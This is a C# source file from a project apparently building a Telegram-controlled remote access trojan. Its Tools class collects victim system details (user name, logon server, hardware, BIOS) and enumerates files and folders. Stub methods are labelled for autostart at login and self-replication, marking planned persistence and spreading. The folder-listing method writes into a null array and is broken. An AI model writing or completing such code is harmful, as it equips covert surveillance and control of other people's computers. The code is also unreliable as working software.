using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;
using System.IO;
using Microsoft.SqlServer.Server;

namespace RAT_BotTelegram.Lib {
    internal sealed class Tools {

        public static String PC_Info() {
            Console.WriteLine(Features.getArchitecture());
            String Info = "Detailed Computer Information" +

                "\n\n*UserData *" +
                "\n - User Name: " + Features.getUserName() +
                "\n - User Profile: C:\\User\\" + Features.getUserName() +
                "\n - User Domain: " + Features.getUserName() +
                "\n - Logon Server: " + Features.getLogonServer() +
                "\n - AppData: C:\\Users\\" + Features.getUserName() + @"\AppData\Roaming " +
                "\n - Home Path: \\Users\\" + Features.getUserName() +


                "\n\n*Processor *" +
                "\n - Name: " + Features.getProcessorName() +
                "\n - Frequency: " + Features.getProcessorGhz() + " Ghz" +
                "\n - Architecture: " + Features.getArchitecture() +


                "\n\n*Motherboard *" +
                "\n - Name: " + Features.getMotherboardName() +
                "\n - Manufacturer: " + Features.getMotherboardManufacturer() +
                "\n - BIOSVendor: " + Features.getBIOSVendor() +

                "";
            return Info;
        }

        public static string[] GetFile(string dir) {
            // Obtiene Nombre del procesador
            try {

                string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
                return allfiles;
            } catch (Exception e) {
                string[] allfiles = { "[-]" };
                Console.WriteLine("La carpeta no existe: " + e);
                return allfiles;
            }
        }
        public static string[] GetFolder() {
            // Obtiene Nombre del procesador
            string[] allfiles = null;
            int n = 0;
            try {
                foreach (string folder in Directory.GetDirectories(@"C:\")) {
                    n = n + 1;
                    allfiles[n] = folder;

                    //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
                    //GetDirectoryAll(folder, indent + 2);
                }
            } catch (UnauthorizedAccessException) {
            }



            return allfiles;
            //try {
            //    string[] allFolder = Directory.GetDirectories(dir);
            //    //string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
            //    return allFolder;
            //} catch (Exception e) {
            //    string[] allfiles = { "[-]" };
            //    Console.WriteLine("La carpeta no existe: " + e);
            //    return allfiles;
            //}
        }

        public static void StartUp() {  // Autoiniciar al iniciar sesión

        }
        public static void Trojan() {   // Se replica en el sistema 


        }
    
    
    }
}
